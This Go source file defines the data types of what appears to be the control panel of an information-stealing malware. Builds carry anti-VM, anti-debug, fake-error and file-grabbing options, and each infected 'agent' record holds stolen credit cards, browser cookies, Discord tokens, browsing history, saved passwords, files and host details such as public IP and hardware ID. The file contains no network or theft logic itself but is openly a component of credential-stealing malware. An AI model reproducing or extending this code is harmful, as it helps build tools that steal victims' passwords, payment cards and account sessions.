package global

var Settings TSettings = TSettings{
	Language: "en",
}

type TSettings struct {
	Password string `json:"password"`
	Language string `json:"language"`
}

type TFilesConfig struct {
	Dirs []string `json:"MAP$config.files.dirs$"`
	Exts []string `json:"MAP$config.files.exts$"`
	Max  int      `json:"MAP$config.files.max$"`
}

type TErrorConfig struct {
	Title   string `json:"MAP$config.error.title$"`
	Message string `json:"MAP$config.error.message$"`
}

type TConfig struct {
	Modules []string `json:"MAP$config.modules$"`
	Quiet   bool     `json:"MAP$config.quiet$"`
	Token   string   `json:"MAP$config.token$"`
	URL     string   `json:"MAP$config.url$"`

	AntiVM    bool `json:"MAP$config.antivm$"`
	AntiDebug bool `json:"MAP$config.antidebug$"`

	Files TFilesConfig `json:"MAP$config.files$"`
	Error TErrorConfig `json:"MAP$config.error$"`
}

var Builds []TBuild

type TBuild struct {
	Token   string  `json:"token"`
	Path    string  `json:"path"`
	Name    string  `json:"name"`
	Status  string  `json:"status"`
	Enabled bool    `json:"enabled"`
	Config  TConfig `json:"config"`
}

var Agents []TAgent

type TAgent struct {
	ID    string `json:"id"`
	Token string `json:"token"`

	Sysinfo  TSystemInfo `json:"sys_data"`
	Card     []TCard     `json:"card_data"`
	Cookie   []TCookie   `json:"cookie_data"`
	Discord  []TDiscord  `json:"discord_data"`
	History  []THistory  `json:"history_data"`
	Password []TPassword `json:"password_data"`
	Files    []TFile     `json:"files_data"`
}

type TFile struct {
	Path string `json:"path"`
	Data string `json:"data"`
	Size int64  `json:"size"`
}

type TCard struct {
	From   string `json:"from"`
	Name   string `json:"name"`
	Expire string `json:"expire"`
	Number string `json:"number"`
}

type TCookie struct {
	From    string `json:"from"`
	Domain  string `json:"domain"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Value   string `json:"value"`
	Expires string `json:"expires"`
}

type TDiscord struct {
	From  string `json:"from"`
	Token string `json:"token"`
	User  string `json:"user"`
	ID    string `json:"id"`
	Nitro string `json:"nitro"`
	Email string `json:"email"`
	MFA   bool   `json:"mfa"`
}

type THistory struct {
	From      string `json:"from"`
	Title     string `json:"title"`
	URL       string `json:"url"`
	LastVisit string `json:"lastvisit"`
}

type TPassword struct {
	From     string `json:"from"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type TSystemInfo struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	PublicIP string `json:"publicip"`
	ISP      string `json:"isp"`
	Country  string `json:"country"`
	Timezone string `json:"timezone"`
	Memory   string `json:"memory"`
	Disk     string `json:"disk"`
	HWID     string `json:"hwid"`
	CPU      string `json:"cpu"`
	GPU      string `json:"gpu"`
	OS       string `json:"os"`
}
